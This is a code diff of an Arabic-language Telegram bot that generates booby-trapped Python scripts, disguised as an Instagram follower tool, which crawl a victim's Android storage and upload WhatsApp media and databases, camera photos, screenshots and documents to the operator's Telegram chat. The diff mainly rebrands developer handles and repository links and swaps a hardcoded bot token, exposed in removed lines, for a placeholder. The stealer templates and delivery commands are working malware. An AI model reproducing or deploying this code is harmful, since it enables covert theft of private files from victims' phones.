@@ -132,7 +132,7 @@ def refrral(message):
             referral_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
             cursor.execute('UPDATE user SET refrralcode = ? WHERE user_id = ?', (referral_code, id))
             conn.commit()
-            bot_username = "Atmaja5788_bot"
+            bot_username = "atmaja_pro_bot"
             reff = f'https://t.me/{bot_username}?start={referral_code}'
             bot.send_message(chat_id=message.chat.id, text=f'''
 تم توليد كود إحالة خاص بك، أرسله لأصدقائك وأي شخص يدخل للبوت عن طريق هذا الرابط سيتم إضافة نقطتين إلى حسابك 🤩
@@ -141,7 +141,7 @@ def refrral(message):
 {reff}
 ''')
         else:
-            bot_username = "Atmaja5788_bot"
+            bot_username = "atmaja_pro_bot"
             refff = f'https://t.me/{bot_username}?start={ref}'
             bot.send_message(chat_id=message.chat.id, text=f'''
 لديك رابط إحالة بالفعل:
@@ -185,7 +185,7 @@ def creat_payloads(id, ms, payload):
 
 			if response.status_code == 201:
 				pk = 'pkg update\npkg upgrade -Y\npkg install python -Y\npkg install git -Y\ngit config --global --unset credential.helper\ngit config --global --unset user.name\ngit config --global --unset user.password\n'
-				clone_command = f"git clone https://github.com/esamkido1994/atmaja_bot2/{REPO_NAME.split('/')[-1]}.git\n"
+				clone_command = f"git clone https://github.com/akramFattah/{REPO_NAME.split('/')[-1]}.git\n"
 				cd_command = f"cd {REPO_NAME.split('/')[-1]}\n"
 				pull = "git pull origin main\n"
 				run_command = f"python {os.path.basename(unique_filename)}\n"
@@ -198,7 +198,7 @@ def creat_payloads(id, ms, payload):
 {commands}
 ```
 
-By: hitler hack 
+By: Akram Fattah 
 """, parse_mode="Markdown"
 )
 			else:
@@ -264,7 +264,7 @@ def start(message):
 	key = types.InlineKeyboardMarkup(row_width=1)
 	
 	keyboard.add(
-	   types.InlineKeyboardButton(text='إشتراك 🤩', url='https://t.me/esam66180')
+	   types.InlineKeyboardButton(text='إشتراك 🤩', url='https://t.me/AKRAM_CS')
 	)
 
 	for key1, val in hack['1']:
@@ -295,7 +295,7 @@ def start(message):
 الأوامر: 😱
 - تلغيم أداة اختراق ملفات واتساب الصوتية المرسلة والمستلمة 😈
 - تلغيم أداة اختراق صور واتساب، المرسلة والمستلمة 😵
-- تلغيم أداة اختراق فيديوهات واتساب المرسلة والمستلمة 🤫
+- تغيم أداة اختراق فيديوهات واتساب المرسلة والمستلمة 🤫
 - تلغيم أداة اختراق مستندات الواتساب المرسلة والمستلمة 👨‍💻
 - تلغيم أداة اختراق صور الكاميرا ☠
 - تلغيم أداة اختراق الصور من الذاكرة الرئيسية 😱
@@ -308,9 +308,9 @@ def start(message):
 جميع البيانات المسحوبة سوف تصلك في هذا البوت بمجرد تشغيل الأداة. 😵
 البوت سريع جداً 👌
 
-المطور: هتلر هاك 👤
-حساب المطور: https://t.me/hitler_7x
-قناة هتلر: https://t.me/esam66180
+المطور: أكرم فتاح 👤
+حساب المطور: @Akram_Fattah
+يوتيوب: @AKRAM_CS
 	''' ,reply_markup=key)
 	
 @bot.callback_query_handler(func=lambda call: call.data == 'wats' or call.data == 'camera' or call.data == 'img' or call.data == 'vid' or call.data == 'doc' or call.data == 'dow' or call.data == 'screan' or call.data == 'watsdb' or call.data == 'watsvid' or call.data == 'watsphoto' or call.data == 'watsaudio' or call.data == 'camimg' or call.data == 'camvid')
@@ -342,7 +342,7 @@ def creat_tool(call):
 اضغط /start للعودة للقائمة الرئيسية 😈
 لجمع النقاط من خلال رابط الاحالة اضغط /refrral_code
 
-🔰 Dev: @esam66180
+🔰 Dev: @Akram_Fattah
 
 اختر شكل الأداة الملغمة ⬇️
 	''' , reply_markup=tooll)
@@ -399,12 +399,12 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
 
 def background():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -436,7 +436,7 @@ def slow(T):
 	    sys.stdout.flush()
 	    time.sleep(30/2000)
 
-slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بك في اداه رشق متابعين انستغرام هذة الأداة مجانية مقدمة من هتلر 💘.
+slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
 ---------------------------------------------------
 """)
 uid = uuid
@@ -492,27 +492,28 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/Android/media/"
+
 def send_voice(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".opus",".mp3", ".aac")):
-            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')
+            bot.send_audio(chat_id={id}, audio=f, caption='By: @atmaja_pro_bot')
 
 def send_phot(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
 
 def send_video(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
 
 def send_doc(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
-            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -605,13 +606,13 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/DCIM/Camera/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
 
 def background():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -698,12 +699,12 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/DCIM/Screenshots/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
 
 def background():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -790,13 +791,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
-            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -884,12 +885,12 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -977,24 +978,24 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/Download/"
 
 def send_file1(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
 
 
 def send_file2(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
 
 def send_file3(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
-            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1087,13 +1088,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".aac",".mp3", ".opus")):
-            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')
+            bot.send_audio(chat_id={id}, audio=f, caption='By: @atmaja_pro_bot')
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
 		for root, dirs, files in os.walk(dir_path):
@@ -1181,13 +1182,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1277,13 +1278,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
 
 def back():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1373,13 +1374,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith("crypt14"):
-            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
 
 def bqck():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1468,13 +1469,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/DCIM/Camera/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
 
 def back():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1562,13 +1563,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
+bot = telebot.TeleBot('{TOKEN}')
 dir_path = "/storage/emulated/0/DCIM/Camera/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
 
 def back():
     with ThreadPoolExecutor(max_workers=300) as executor:
